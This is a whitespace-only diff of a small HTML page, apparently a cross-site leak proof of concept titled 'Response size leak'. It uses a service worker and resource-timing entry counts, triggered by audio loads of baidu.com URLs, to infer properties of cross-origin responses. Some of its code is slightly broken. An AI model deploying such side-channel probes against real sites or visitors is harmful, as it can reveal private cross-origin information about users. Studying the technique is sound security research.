@@ -1,42 +1,42 @@
 <!DOCTYPE html>
 <html>
-	<head>
-		<title>Response size leak</title>
-		<script>
-			if ("serviceWorker" in navigator) {
-				addEventListener("load", async () => {
-					performance.setResourceTimingBufferSize(1337);
-					const registration = await navigator.serviceWorker.register("static/serviceworker.js");
-					if (registration.installing)
-						location.reload();
-				});
-			}
+  <head>
+    <title>Response size leak</title>
+    <script>
+      if ("serviceWorker" in navigator) {
+        addEventListener("load", async () => {
+          performance.setResourceTimingBufferSize(1337);
+          const registration = await navigator.serviceWorker.register("static/serviceworker.js");
+          if (registration.installing)
+            location.reload();
+        });
+      }
 
-			function singleSizeCheck(url, size) {
-				let start = performance.getEntries().length;
-				let sound = document.createElement("audio");
-				sound.src = `${url}?size=${size}}`;
-				return new Promise((resolve) => {
+      function singleSizeCheck(url, size) {
+        let start = performance.getEntries().length;
+        let sound = document.createElement("audio");
+        sound.src = `${url}?size=${size}}`;
+        return new Promise((resolve) => {
           sound.onload = () => {
             let diff = performance.getEntries().length - start;
             document.body.innerHTML += url + ' onload ' + diff + '<br>';
-						return resolve(diff);
+            return resolve(diff);
           }
 
-					sound.onerror = () => {
-						let diff = performance.getEntries().length - start;
+          sound.onerror = () => {
+            let diff = performance.getEntries().length - start;
             document.body.innerHTML += url + ' onerror ' + diff + '<br>';
-						return resolve(diff);
-					}
-				});
-			}
+            return resolve(diff);
+          }
+        });
+      }
 
 
-			
-			onload = () => {
+      
+      onload = () => {
         setTimeout(singleSizeCheck("https://www.baidu.com/asdf", 1), 1000);
         setTimeout(singleSizeCheck("https://www.baidu.com/robots.txt", 1), 2000);
-			}
+      }
 
     </script>
   </head>
